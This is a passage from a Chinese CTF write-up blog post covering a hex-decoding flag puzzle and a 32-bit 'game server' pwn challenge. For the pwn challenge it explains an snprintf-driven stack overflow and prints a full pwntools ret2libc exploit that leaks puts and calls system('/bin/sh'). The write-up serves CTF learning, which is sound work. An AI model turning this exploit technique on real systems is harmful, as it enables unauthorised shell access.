+<p>4d 4d 4d 75 4d 48 4d d3 4e 79 4a 4c 4a 4b 4d 4d 4a 50 4a 4b 4a 4d 4d e3 4a 4c 49 66 4d 4d 4a 50 4a 4c 4d 48 49 78 4a f3 4d 48 4a 47 4d 48 49 71 4d 49 4d 48 4a 4a 4a 03 49 76 4a 4e 4d 49 4a 48 4a 4e 4a 48 4d 48 4a 13 4d 4c 4d 4a 4d 48 4a 4f 4a 49 4e 65</p>
+</blockquote>
+<p>看成 ASCII 码转成字符是：</p>
+<blockquote>
+<p>MMMuMHM?NyJLJKMMJPJKJMM?JLIfMMJPJLMHIxJ?MHJGMHIqMIMHJJJ?IvJNMIJHJNJHMHJ?MLMJMHJOJINe</p>
+</blockquote>
+<p>其中问号是不可显示字符，是题目故意设置的障碍，要在标签 <code>LABEL_17</code> 中才能解出。先不管问号，把已知的部分按刚才分析的加密算法反过来做，大写字母还原回数字，小写字母还原回字母，就能得到：</p>
+<blockquote>
+<p>66 6c 61 6? 7b 35 34 66 39 34 36 6? 35 2d 66 39 35 61 2d 3? 61 30 61 2d 62 61 33 3? 2d 37 62 31 37 31 61 3? 65 63 61 38 32 7d</p>
+</blockquote>
+<p>看成 ASCII 码转成字符是：</p>
+<blockquote>
+<p>fla?{54f946?5-f95a-?a0a-ba3?-7b171a?eca82}</p>
+</blockquote>
+<p>由于已知 flag 前四位，第四位问号可以补出。剩下四位未知字符需要在标签 <code>LABEL_17</code> 中确定，据说是一个 CRC32 算法。但因为只有四位字符，运算量不大，我就直接爆破了。 <span class="math display">\[
+flag\{54f946f5-f95a-4a0a-ba31-7b171a7eca82\}
+\]</span> <img src="//i.loli.net/2019/05/03/5ccc25130e1ed.jpg"></p>
+<h3 id="x2.-pwn---game-server">0x2. Pwn - game server</h3>
+<p>一道简单的栈溢出。拿到文件先扔进 file 命令，看到是 32 位 ELF，再检查保护机制，只开启了 NX 和 Partial RELRO。扔进 IDA，<code>main</code> 函数除了调用 <code>sub_8048637</code> 外，没有任何有趣的地方。进入 <code>sub_8048637</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048637</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+7h] [bp-111h]@5</span></div><div class="line">  <span class="keyword">char</span> v2; <span class="comment">// [sp+107h] [bp-11h]@5</span></div><div class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [sp+108h] [bp-10h]@5</span></div><div class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [sp+10Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to my game server"</span>);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"First, you need to tell me you name?"</span>);</div><div class="line">  fgets(byte_804A180, <span class="number">256</span>, <span class="built_in">stdin</span>);</div><div class="line">  v4 = <span class="built_in">strrchr</span>(byte_804A180, <span class="number">10</span>);</div><div class="line">  <span class="keyword">if</span> ( v4 )</div><div class="line">    *v4 = <span class="number">0</span>;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, byte_804A180);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"What's you occupation?"</span>);</div><div class="line">  fgets(byte_804A080, <span class="number">256</span>, <span class="built_in">stdin</span>);</div><div class="line">  v4 = <span class="built_in">strrchr</span>(byte_804A080, <span class="number">10</span>);</div><div class="line">  <span class="keyword">if</span> ( v4 )</div><div class="line">    *v4 = <span class="number">0</span>;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Well, my noble %s\n"</span>, byte_804A080);</div><div class="line">  nbytes = <span class="built_in">snprintf</span>(</div><div class="line">             &amp;s,</div><div class="line">             <span class="number">0x100</span>u,</div><div class="line">             <span class="string">"Our %s is a noble %s. He is come from north and well change out would."</span>,</div><div class="line">             byte_804A180,</div><div class="line">             byte_804A080);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Here is you introduce"</span>);</div><div class="line">  <span class="built_in">puts</span>(&amp;s);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Do you want to edit you introduce by yourself?[Y/N]"</span>);</div><div class="line">  v2 = getchar();</div><div class="line">  getchar();</div><div class="line">  <span class="keyword">if</span> ( v2 == <span class="number">89</span> )</div><div class="line">    read(<span class="number">0</span>, &amp;s, nbytes);</div><div class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"name : %s\noccupation : %s\nintroduce : %s\n"</span>, byte_804A180, byte_804A080, &amp;s);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>注意到倒数第三行的 <code>read</code> 第三个参数（读入的长度）是变量，而这个变量的值又由上面的 <code>snprintf</code> 的返回值决定。查手册得知 <code>snprintf</code> 的返回值是“假设第二个参数足够大时将会写入的字符数，不计结束符”（“The number of characters that would have been written if n had been sufficiently large, not counting the terminating <em>null character</em>.”）。就是说返回值并不是<em>实际</em>写入的字符数，而是<em>本来应该</em>写入的字符数。又因为格式字符串的长度受到用户输入的控制，我们可以往缓冲区 <code>s</code> 中写入超过其大小的数据，造成栈溢出。只要在输入 name 和 occupation 时各输入 255 字节的数据就能利用漏洞覆盖返回地址，用 GDB 很容易确定溢出点偏移是 277。</p>
+<p>接下来问题是返回到哪里，程序本身没有 <code>system</code> 函数，也没有 <code>/bin/sh</code> 字符串，考虑泄露 libc 中的函数地址。程序里有 <code>puts</code>，利用它先泄露一个 <code>puts</code> 的地址（返回到 <code>puts</code>，把 <code>puts</code> 的 GOT 地址放在栈上作为参数传入），再去 libc-database 里查服务器的 libc 版本。查到后就可以计算出 <code>system</code> 函数的地址和 <code>/bin/sh</code> 字符串的地址。这里需要在泄露 <code>puts</code> 地址之后返回到 <code>main</code> 函数再次触发栈溢出，这次才返回到 <code>system</code>（因为第一次的时候还不知道 <code>system</code> 的地址，泄露完之后才能计算出）。Exp 如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level=<span class="string">'debug'</span></div><div class="line">p = process(<span class="string">'./pwn2'</span>)</div><div class="line"><span class="comment">#p = remote('123.59.138.180','20000')</span></div><div class="line">elf = ELF(<span class="string">'./pwn2'</span>)</div><div class="line">libc = ELF(<span class="string">'./libc.so'</span>)</div><div class="line"></div><div class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</div><div class="line">read_plt = elf.plt[<span class="string">'read'</span>]</div><div class="line">puts_got = elf.got[<span class="string">'puts'</span>]</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"puts_plt: "</span>+hex(puts_plt)</div><div class="line"><span class="keyword">print</span> <span class="string">"read_plt: "</span>+hex(read_plt)</div><div class="line"><span class="keyword">print</span> <span class="string">"puts_got: "</span>+hex(puts_got)</div><div class="line"></div><div class="line">main_add = <span class="number">0x080485cb</span></div><div class="line">poc = <span class="string">'A'</span>*<span class="number">277</span>+p32(puts_plt)+p32(main_add)+p32(puts_got)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwning</span><span class="params">(i)</span>:</span></div><div class="line">	p.recvuntil(<span class="string">'name?'</span>)</div><div class="line">	p.sendline(<span class="string">'A'</span>*<span class="number">255</span>)</div><div class="line">	p.recvuntil(<span class="string">'N]'</span>)</div><div class="line">	p.sendline(<span class="string">'Y'</span>)</div><div class="line">	p.send(poc)</div><div class="line">	p.recvuntil(<span class="string">'duce : '</span>)</div><div class="line">	<span class="keyword">if</span>(i==<span class="number">1</span>):</div><div class="line">		p.recvn(<span class="number">277</span>+<span class="number">13</span>)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		p.recvn(<span class="number">277</span>)</div><div class="line"></div><div class="line">pwning(<span class="number">1</span>)</div><div class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">'puts_add: '</span> + hex(puts_addr)</div><div class="line"></div><div class="line">libc = ELF(<span class="string">'./libc.so'</span>)</div><div class="line">binsh = next(libc.search(<span class="string">'/bin/sh'</span>))</div><div class="line">sys_off = libc.symbols[<span class="string">'system'</span>]</div><div class="line">puts_off = libc.symbols[<span class="string">'puts'</span>]</div><div class="line">off = sys_off - puts_off</div><div class="line">off2 = binsh - puts_off</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">'sys_off: '</span> + hex(sys_off)</div><div class="line"><span class="keyword">print</span> <span class="string">'puts_off: '</span> + hex(puts_off)</div><div class="line"><span class="keyword">print</span> <span class="string">'off: '</span> + hex(puts_addr+off)</div><div class="line"><span class="keyword">print</span> <span class="string">'binsh: '</span> + p32(binsh).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>)</div><div class="line"></div><div class="line">poc = <span class="string">'A'</span>*<span class="number">277</span>+p32(puts_addr+off)+<span class="string">'AAAA'</span>+p32(puts_addr+off2)</div><div class="line">pwning(<span class="number">2</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>最后 flag： <span class="math display">\[
+flag\{f3b92d795c9ee0725c160680acd084d9\}
+\]</span></p>
+<div class="figure">
+<img src="//i.loli.net/2019/05/03/5ccc25132c51e.jpg">
+
+</div>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/06/24/on-the-word-complement/" data-toggle="tooltip" data-placement="top" title="谈“complement”">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/02/19/t3sec-warm-up-writeup/" data-toggle="tooltip" data-placement="top" title="2018 西普杯铁三赛测评题解题报告（writeup）">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+                
+                <!-- Valine 评论框 start -->
+                <div class="comment" id="comment"></div>
+                <!-- Valine 评论框 end -->
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+<!-- Valine 公共JS代码 start (一个网页只需插入一次) -->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+    var valine_id = 'SxcVY94eFyRKqKoNsjvUdVru-gzGzoHsz';
+    var valine_key =  'gtaegP4TT3CzPJH7bwy54kkV';
+    new Valine({
+        el: '#comment',
+        appId: valine_id,
+        appKey: valine_key,
+        notify: true,
+        visitor: true,
+        placeholder: '留下邮箱才能收到评论回复通知嗷', // 留言框占位提示文字
+    });
+</script>
+<!-- Valine 公共JS代码 end -->
+
+
+
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+                    <li>
+                        <a target="_blank" href="https://www.zhihu.com/people/zack-48">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa  fa-stack-1x fa-inverse">知</i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/hx1997">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Goulash 2023 
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="https://github.com/Kaijun">Kaijun</a>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.2/dist/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.jsdelivr.net/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.jsdelivr.net/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://hx1997.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.jsdelivr.net/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://hx1997.github.io/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work --><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config("");
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+</body>
+
+</html>
